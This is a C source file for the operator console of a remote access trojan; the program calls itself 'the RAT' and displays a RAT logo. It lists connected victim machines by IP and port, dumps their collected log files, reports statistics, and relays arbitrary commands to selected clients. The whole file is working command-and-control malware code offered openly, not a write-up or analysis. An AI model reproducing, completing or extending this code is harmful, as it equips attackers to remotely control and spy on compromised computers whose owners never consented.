#define __USE_GNU
#include "serverlib.h"

void print_logs()
{
    pthread_mutex_lock(&clients_mutex);

    DIR *dir;
    struct dirent *entry;
    char filepath[270];

    dir = opendir("client_logs");
    if (dir == NULL)
    {
        perror("Error opening client_logs directory");
        return;
    }
    while ((entry = readdir(dir)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(filepath, sizeof(filepath), "client_logs/%s", entry->d_name);

        int fd = open(filepath, O_RDONLY);
        if (fd == -1)
        {
            perror("Error opening file");
            continue;
        }

        struct stat st;
        if (fstat(fd, &st) == -1)
        {
            perror("Error getting file size");
            close(fd);
            continue;
        }

        char *buffer = malloc(st.st_size + 1);
        if (buffer == NULL)
        {
            perror("Error allocating memory");
            close(fd);
            continue;
        }

        ssize_t bytes_read = read(fd, buffer, st.st_size);
        if (bytes_read == -1)
        {
            perror("Error reading file");
            free(buffer);
            close(fd);
            continue;
        }

        buffer[bytes_read] = '\0';

        write(1, "=== File: ", 10);
        write(1, entry->d_name, strlen(entry->d_name));
        write(1, " ===\n", 5);
        write(1, buffer, bytes_read);
        write(1, "\n\n", 2);

        free(buffer);
        close(fd);
    }

    closedir(dir);
    pthread_mutex_unlock(&clients_mutex);
}

void list_clients()
{
    pthread_mutex_lock(&clients_mutex);

    printf("Clienti conectati:\n");
    for (int i = 0; i < client_count; i++)
    {
        if (clients[i] != NULL)
        {
            char *ip_address = inet_ntoa(clients[i]->address.sin_addr);
            int port = ntohs(clients[i]->address.sin_port);
            printf("Client %d: %s\tPort:%d IP:%s\n", i + 1, clients[i]->station_info, port, ip_address);
        }
    }

    pthread_mutex_unlock(&clients_mutex);
}

void list_commands()
{
    printf("\n");
    printf("\b%s:     clears the console\n", commands[0]);
    printf("\b%s:      exits the RAT\n", commands[1]);
    printf("\b%s:      list of connected clients\n", commands[2]);
    printf("\b%s:     stats of the connected clients\n", commands[3]);
    printf("\b%s:       log files contents\n", commands[4]);
    printf("\b%s:  available commands\n", commands[5]);
    printf("\n");
}

void print_prompt()
{
    printf("███▓▒░ ");
    fflush(stdout);
}

void handle_terminal_input()
{
    char *input;
    rl_attempted_completion_function = custom_completion;
    rl_completer_word_break_characters = " ";

    system("clear");
    info();

    while (1)
    {
        print_prompt();
        input = readline(NULL);

        if (input == NULL)
        {
            printf("\nError reading input or EOF received. Exiting.\n");
            break;
        }

        if (input[0] == '\0')
        {
            system("clear");
            info();
            free(input);
            continue;
        }

        char *trimmed_input = strdup(input);

        if (trimmed_input)
        {
            char *start = trimmed_input;
            char *end = trimmed_input + strlen(trimmed_input) - 1;

            while (*start && isspace(*start))
                start++;
            while (end > start && isspace(*end))
                *end-- = '\0';

            if (*start)
            {
                add_history(start);
            }
            free(trimmed_input);
        }

        if (handle_builtin_commands(input))
        {
            free(input);
            continue;
        }

        if (handle_client_command(input))
        {
            free(input);
            continue;
        }

        system("clear");
        info();
        free(input);
    }

    cleanup_and_exit();
}

bool handle_builtin_commands(const char *input)
{
    if (strstr(input, "exit") == input)
    {
        printf("Exiting terminal input handler.\n");
        cleanup_and_exit();
        exit(EXIT_SUCCESS);
        return true;
    }

    if (strstr(input, "commands") == input)
    {
        list_commands();
        return true;
    }

    if (strstr(input, "clear") == input)
    {
        system("clear");
        info();
        return true;
    }

    if (strstr(input, "list") == input)
    {
        list_clients();
        return true;
    }

    if (strstr(input, "stats") == input)
    {
        char *processed = process_clients_statistics();
        if (processed)
        {
            printf("%s", processed);
            free(processed);
        }
        return true;
    }

    if (strstr(input, "log") == input)
    {
        print_logs();
        return true;
    }

    return false;
}

bool handle_client_command(const char *input)
{
    if (strncmp(input, "client", 6) != 0)
    {
        return false;
    }
    char *input_copy = strdup(input);
    if (!input_copy)
    {
        printf("Memory allocation error\n");
        return true;
    }
    char *colon = strchr(input_copy, ':');
    if (!colon)
    {
        printf("Invalid command format. Use: client<list>: <command>\n");
        free(input_copy);
        return true;
    }
    *colon = '\0';
    char *client_list = input_copy + 6;
    while (isspace(*client_list))
        client_list++;

    char *command = colon + 1;
    while (isspace(*command))
        command++;

    if (strlen(client_list) == 0)
    {
        printf("Client list cannot be empty.\n");
        free(input_copy);
        return true;
    }

    if (strlen(command) == 0)
    {
        printf("Command cannot be empty.\n");
        free(input_copy);
        return true;
    }

    send_to_client_list(client_list, command);

    free(input_copy);
    return true;
}

void cleanup_and_exit()
{
    for (int i = 0; i < MAX_CLIENTS; i++)
    {
        if (clients[i] != NULL)
        {
            close(clients[i]->socket);
            free(clients[i]);
        }
    }
    free_commands();
    rl_clear_history();
}

void info()
{
    printf("\n\n");
    struct winsize w;
    ioctl(STDOUT_FILENO, TIOCGWINSZ, &w);

    int terminalWidth = w.ws_col;

    char first[] = "Enter command (clientX:command or clientX,Y,Z:command or clientX-Y:command)\n";
    char second[] = "Use TAB for autocomplete, 'commands' to print built-in available commands:\n";

    int textLength1 = 38;
    int textLength2 = 35;
    int textLength3 = strlen(first);
    int textLength4 = strlen(second);

    int padding1 = (terminalWidth - textLength1) / 2;
    int padding2 = (terminalWidth - textLength2) / 2;
    int padding3 = (terminalWidth - textLength3) / 2;
    int padding4 = (terminalWidth - textLength4) / 2;

    for (int i = 0; i < padding1; i++)
    {
        printf(" ");
    }
    char RAT_LOGO[][256] = {" ░▒▓███████▓▒░  ░▒▓██████▓▒░ ▒▓███████▓▒░\n",
                            "░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░\n",
                            "░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░\n",
                            "░▒▓███████▓▒░░ ▒▓████████▓▒░  ░▒▓█▓▒░\n",
                            "░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░\n",
                            "░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░\n",
                            "░▒▓█▓▒░░▒▓█▓▒░ ▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░\n"};
    printf("%s", RAT_LOGO[0]);

    for (int j = 1; j < 6; ++j)
    {
        for (int i = 0; i < padding2; ++i)
        {
            printf(" ");
        }
        printf("%s", RAT_LOGO[j]);
    }

    printf("\n");

    for (int i = 0; i < padding3; ++i)
    {
        printf(" ");
    }
    printf("%s", first);

    for (int i = 0; i < padding4; ++i)
    {
        printf(" ");
    }
    printf("%s\n", second);
}
